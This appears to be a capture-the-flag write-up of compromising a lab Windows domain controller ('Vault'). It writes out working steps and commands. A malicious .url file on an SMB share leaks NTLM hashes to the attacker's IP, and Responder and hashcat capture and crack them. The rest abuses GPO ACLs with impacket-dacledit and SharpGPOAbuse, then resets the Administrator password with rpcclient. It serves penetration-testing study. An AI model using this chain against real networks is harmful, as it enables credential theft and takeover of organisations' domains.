#box #ntlm-theft  #responder #hashcat #ldapsearch #impacket-dacledit #SharpGPOAbuse #rpc-setuserinfo  
## Nmap

```bash
# Nmap 7.95 scan initiated Sat Jul  5 04:04:47 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 192.168.101.172
Nmap scan report for 192.168.101.172
Host is up (0.033s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-05 08:04:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-05T08:05:36+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2025-07-04T07:48:23
|_Not valid after:  2026-01-03T07:48:23
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-05T08:04:56+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-05T08:04:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  5 04:05:36 2025 -- 1 IP address (1 host up) scanned in 49.56 seconds
```

## 445 - SMB & Foothold

After looking at other resources, we find interesting the presence of an unusual Shared area in the SMB service. Precisely, the shared is called `DocumentsShare`. It seems to be writable, thus it should be possible to catch the NTLM of the user thoughout a NTLM Relay attack.

To set up the attack, we first have to create a malicious file which will point back to our system, for instance, the following `.url` file:

```bash
[InternetShortcut]  
URL=Random_nonsense  
WorkingDirectory=Flibertygibbit  
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon  
IconIndex=1
```

>We could eventually use the following repository to create similar file of different type: https://github.com/Greenwolf/ntlm_theft

Once the file has been created, we first run our Spoofer `Responder`

```bash
responder -I tun0
```

Then we can upload it on the DocumentsShare folder with the following command:

```bash
smbclient -N //192.168.101.172/DocumentsShare -c 'mput Evil.url' # it will then ask for confirmation, it's enough to type `y`
```

Once uploaded, an user that will try to access this icon will be redirect to our tun0 IP (specified above) and the %USERNAME% alongside the NTLM hash will be printed in our Responder session

We'll then save the NTLMv2 and proceed to crack it with hashcat:

```bash
hashcat -m 5600 anirudh_ntlmv2 /usr/share/wordlists/rockyou.txt
```

Obtaining the following credentials: `VAULT\anirudh:SecureHM`.

## Enumeration

After reaching the initial foothold, we can achieve different new enumeration in the system. We can for instance extract the LDAP:

```bash
ldapsearch -H ldap://192.168.101.172 -D 'anirudh@vault.offsec' -w 'SecureHM' -b 'dc=vault,dc=offsec' > ldap.out
```

Or extract the AD structure within [[Collecting Data#^bloodhound-python-collecting-with-ip-and-zip|bloodhound-python]].

## Bloodhound Enumeration and WriteDacl abuse

Within bloodhound, we discover that the user `anirudh` has various attack vector towards the Default Domain Policy GPO

We opt for using the WriteDacl vector and we'll basically write custom rights for Anirudh over this GPO. 
Before writing, let's check the actual state of the GPO over that user:
```bash
impacket-dacledit -action 'read' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec' 'VAULT'/'anirudh':'SecureHM' -dc-ip 192.168.101.172                        

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-537427935-490066102-1511301751-1103)
[*]   ACE[3] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : WriteOwner, WriteDACL, ReadControl, Delete, WriteProperties, ReadProperties, ListChildObjects, DeleteChild, CreateChild (0xf0037)
[*]     Trustee (SID)             : anirudh (S-1-5-21-537427935-490066102-1511301751-1103)
```

We notice that we have different rights, that we can also correctly notice within bloodhound, but at this point following bloodhound suggestion we can opt to give the user `FullControl` over that GPO, and we can use the following command to do so (targeting the Distinguised Name of the GPO:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec' 'VAULT'/'anirudh':'SecureHM' -dc-ip 192.168.101.172
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250721-132214.bak
[*] DACL modified successfully!
```

By checking that again, we notice how our user has now FullControl over that GPO:

```bash
impacket-dacledit -action 'read' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec' 'VAULT'/'anirudh':'SecureHM' -dc-ip 192.168.101.172            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-537427935-490066102-1511301751-1103)
[*]   ACE[3] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff) # We added the FullControl ACE
[*]     Trustee (SID)             : anirudh (S-1-5-21-537427935-490066102-1511301751-1103)
[*]   ACE[4] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : WriteOwner, WriteDACL, ReadControl, Delete, WriteProperties, ReadProperties, ListChildObjects, DeleteChild, CreateChild (0xf0037)
[*]     Trustee (SID)             : anirudh (S-1-5-21-537427935-490066102-1511301751-1103)
```

## GPLink and GPOAbuse

GPLink permits to apply a given GPO modification on the linked OU. Default Domain Policy is GPLinked to the Domain:

thus we shall be able to abuse the GPO to control the whole domain by simply controlling that GPO (on which we now have FullControl). 
To do so, we can use a tool called [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), and simply add our user as a LocalAdmin. By doing so, we'll basically be LocalAdmin of the DC converting us into the Domain Administrators.
We then download SharpGPOAbuse and upload the executable throughout evil-winrm on `C:\Temp` (we create the folder if it doesn't exist).
Once uploaded, we use the following command to successfully add ourselves to the Admin group of the DC.

```bash
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

Once done so, we'll be free to use any vector to successfully escalate our session to user. I opted to use `rpcclient` to change the Administrator's password and authenticate as administrator:
```bash
rpcclient -U "vault/anirudh" 192.168.101.172
rpcclient $> setuserinfo2 Administrator 23 Test123!
```

We'll now be able to authenticate, as Administrator, within `evil-winrm` (or eventually in RDP), obtaining the system flag.

```bash
evil-winrm -u Administrator -i 192.168.101.172

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vault\administrator
```
